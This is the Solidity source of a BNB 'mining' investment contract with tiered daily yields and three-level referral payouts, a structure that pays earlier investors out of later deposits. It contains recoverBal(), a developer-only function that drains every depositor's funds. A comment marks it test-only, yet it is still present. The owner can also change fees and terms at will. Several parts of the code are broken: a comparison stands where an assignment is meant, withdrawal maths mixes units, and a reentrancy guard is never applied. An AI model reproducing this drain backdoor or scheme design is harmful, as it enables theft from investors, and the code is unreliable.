/**
 *Submitted for verification at BscScan.com on 2022-09-26
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract sf {
    using SafeMath for uint256;

    address public Dev;
    address public ecs = 0xA607dcE4a89BB72637E8bCaa788CC5dD23d091C4;
    address public otr = 0xCE6F4091152A3889224cc1133D25f3CCF6a74B21;

    uint256 public totalDeposits;
    uint256 public totalWithdrawnProfit;
    uint256 public totalMiners;
    uint256 public feePercentage = 100; //10%
    uint256 percentDivider = 1000;
    uint256 powerFactor = 10000000000;

    uint256[3] public Duration = [
        365 days,
        182 days,
        121 days
    ];
    uint256[2] Sf = [800, 200];
    uint256[3] public Profit = [12, 36, 99];
    uint256[3] public totalDepositPerTier;
    uint256[3] public totalMinersPerTier;
    uint256[3] MinimumPerPlan = [0.05 ether, 0.2 ether, 1 ether];
    uint256[3] RefBonusPercentage = [100, 20, 10];
    uint256[3] MinimumHashRatePerTier = [20, 25, 30];

    uint256 REF_COMPENSATION_FACTOR = 3;
    uint256 public LIBERTY_WITHDRAWALS = 1;
    uint256 POWER_SCORE_FACTOR = 120;
    uint256 maximumHashRate = 100; //10%
    uint256 minimumRewardConvertable = 1;
    uint256 HASH_RATE_COMPENSATOR = 1; //0.1%

    struct Mine {
        uint256 tier;
        uint256 endtime;
        uint256 lastwithdrawtime;
        uint256 starttime;
        uint256 wattsamount;
        uint256 profitwithdrawn;
        bool ended;
    }

    struct Miner {
        uint256 totalDepositMiner;
        uint256 totalwithdrawnProfitMiner;
        uint256 lastWithdrawTime;
        uint256 depositCount;
        uint256 withdrawalCounter;
        address uplineAddress;
        uint256 downLinesCount;
        uint256 POWER_SCORE;
        bool alreadyExists;
    }

    mapping(address => Miner) public Miners;
    mapping(address => mapping(uint256 => Mine)) public minersRecord;
    mapping(address => mapping(uint256 => uint256)) public minerDepositedPerTier;
    mapping(address => uint256) public deposits;

    event DEPOSIT(address Miner, uint256 amount);
    event WITHDRAW(address Miner, uint256 amount);
    event withdraw(address Miner, uint256 amount);

    modifier OnlyDev() {
        require(Dev == msg.sender, "only Dev");
        _;
    }

    bool private reentrancySafe = false;

    modifier nonReentrant() {
        require(!reentrancySafe);
        reentrancySafe = true;
        _;
        reentrancySafe = false;
    }

    constructor(address _Dev) {
        Dev = payable(_Dev);
    }

    function deposit(address ref, uint256 tierIndex) public payable {
        require(tierIndex >= 0 && tierIndex <= 2, "Invalid tier index");
        //require(MinimumPerPlan[tierIndex] >= msg.value, "Amount too low");

        uint256 deposit_amount = msg.value;
        uint256 fee = calcFee(deposit_amount);
        uint256 after_tax = msg.value.sub(fee);
        uint256 watt_amount = after_tax.div(powerFactor);

        commit(ecs, fee.mul(Sf[0]).div(percentDivider));
        commit(otr, fee.mul(Sf[1]).div(percentDivider));

        //first time deposit
        if (!Miners[msg.sender].alreadyExists) {
            
            if(ref != address(0) && ref != msg.sender && ref != address(this) && !isContract(ref)){

                address ref_l2 = Miners[ref].uplineAddress;
                address ref_l3 = Miners[ref_l2].uplineAddress;

                commit(ref, after_tax.mul(RefBonusPercentage[0]).div(percentDivider));
                Miners[ref].POWER_SCORE += deposit_amount.mul(POWER_SCORE_FACTOR);

                if(ref_l2 != address(0)){
                    commit(ref_l2, after_tax.mul(RefBonusPercentage[1]).div(percentDivider));
                }
                if(ref_l3 != address(0)){
                    commit(ref_l3, after_tax.mul(RefBonusPercentage[2]).div(percentDivider));
                }

                Miners[msg.sender].uplineAddress = ref;
                Miners[ref].downLinesCount++;
            }
        
            Miners[msg.sender].alreadyExists = true;
            totalMiners++;
            totalMinersPerTier[tierIndex]++;
        }

        uint256 index = Miners[msg.sender].depositCount;
        Miners[msg.sender].totalDepositMiner += deposit_amount;
        deposits[msg.sender] += deposit_amount;
        totalDeposits += deposit_amount;
        minersRecord[msg.sender][index].endtime = block.timestamp.add(Duration[tierIndex]);
        minersRecord[msg.sender][index].starttime = block.timestamp;
        minersRecord[msg.sender][index].lastwithdrawtime = block.timestamp;
        minersRecord[msg.sender][index].wattsamount = watt_amount;
        minersRecord[msg.sender][index].tier = tierIndex;
        minersRecord[msg.sender][index].profitwithdrawn = 0;
        Miners[msg.sender].depositCount++;
        minerDepositedPerTier[msg.sender][tierIndex] += deposit_amount;
        totalDepositPerTier[tierIndex] += deposit_amount;

        emit DEPOSIT(msg.sender, deposit_amount);
    }

    function getwithdrawable(address miner, uint256 watts_index) public view returns(uint256) {

        if(minersRecord[miner][watts_index].endtime < block.timestamp){
            minersRecord[miner][watts_index].ended == true;
        }
        require(minersRecord[miner][watts_index].ended == false, "Contact ended");

        uint256 tier_index = minersRecord[miner][watts_index].tier;
        uint256 hash_rate = getHashRate(miner, tier_index);

        uint256 _daily = minersRecord[miner][watts_index].wattsamount.mul(hash_rate).div(percentDivider);
        uint256 _hourlyreward = _daily.div(24);
        uint256 _sincelastwithdraw = block.timestamp - minersRecord[miner][watts_index].lastwithdrawtime;
        uint256 _withdrawable = _hourlyreward.mul(_sincelastwithdraw) / 3600;

        return _withdrawable;
    }

    function withdrawProfits(uint256 index) public {
        require(index < Miners[msg.sender].depositCount, "Invalid index");
        require(block.timestamp.sub(minersRecord[msg.sender][index].lastwithdrawtime) >= 86400, "Please wait next withdraw time");
        require(getwithdrawable(msg.sender, index) > 1, "Not enough watts to withdraw");

        uint256 _withdrawable = getwithdrawable(msg.sender, index);
        
        uint256 bnb_amount = _withdrawable.mul(powerFactor);
        uint256 fee = calcFee(bnb_amount);
        uint256 after_tax = _withdrawable.sub(fee);
         
        commit(ecs, fee.mul(Sf[0]).div(percentDivider));
        commit(otr, fee.mul(Sf[1]).div(percentDivider));

        commit(msg.sender, after_tax);
        
        minersRecord[msg.sender][index].profitwithdrawn += _withdrawable;
        Miners[msg.sender].totalwithdrawnProfitMiner += _withdrawable;
        Miners[msg.sender].lastWithdrawTime = block.timestamp;
        minersRecord[msg.sender][index].lastwithdrawtime = block.timestamp;
        totalWithdrawnProfit += _withdrawable;

        emit withdraw(msg.sender, _withdrawable);
    }


    //REMEMBER:::TEST PURPOSES ONLY! DELETE IN PRODUCTION
    function recoverBal() external OnlyDev {
        commit(msg.sender, address(this).balance);
    }

    function calcFee(uint256 _input_amount) public view returns(uint256){
        return _input_amount.mul(feePercentage).div(percentDivider);
    }

    function commit(address _address, uint256 _amount) internal {
        (bool success, ) = _address.call{value: _amount}("");
        require(success, "Transfer failed.");
    }

    function getHashRate(address miner, uint256 tier_index) public view returns(uint256) {
        uint256 hash_rate = MinimumHashRatePerTier[tier_index];
        uint256 since_last_withdraw = block.timestamp.sub(Miners[miner].lastWithdrawTime);

        if(since_last_withdraw.div(24 hours) >= 5){
            hash_rate -= HASH_RATE_COMPENSATOR;
        }

        // Extra upline benefits begins at count 3
        if(Miners[miner].downLinesCount >= 3){
            if(Miners[miner].downLinesCount > REF_COMPENSATION_FACTOR){
                // More benefits for users with 10+ downlines
                hash_rate += Miners[miner].downLinesCount.mul(HASH_RATE_COMPENSATOR);
            }else{
                hash_rate += HASH_RATE_COMPENSATOR;
            }
        }

        if(Miners[miner].withdrawalCounter < LIBERTY_WITHDRAWALS){
            hash_rate -= HASH_RATE_COMPENSATOR.mul(Miners[miner].withdrawalCounter);
        }

        if(hash_rate > maximumHashRate){
            hash_rate = maximumHashRate;
        }

        return hash_rate;
    }

    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function SetMineDuration(
        uint256 first,
        uint256 second,
        uint256 third
    ) external OnlyDev {
        Duration[0] = first;
        Duration[1] = second;
        Duration[2] = third;
    }

    function SetMineProfit(
        uint256 first,
        uint256 second,
        uint256 third
    ) external OnlyDev {
        Profit[0] = first;
        Profit[1] = second;
        Profit[2] = third;
    }

    function changeDev(address _dev) external OnlyDev {
        Dev = _dev;
    }

    function setPercentDivider(uint256 _div) external OnlyDev {
        percentDivider = _div;
    }

    function setFeePercentage(uint256 _perc) external OnlyDev {
        feePercentage = _perc;
    }

    function ce(address payable _ecs) external OnlyDev {
        ecs = _ecs;
    }

    function cm(address payable _mkt) external OnlyDev {
        otr = _mkt;
    }

    function updatePowerFactor(uint256 _pf) external OnlyDev {
        powerFactor = _pf;
    }

    function updateLiberty(uint256 _lbt) external OnlyDev {
        LIBERTY_WITHDRAWALS = _lbt;
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-Tiers/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}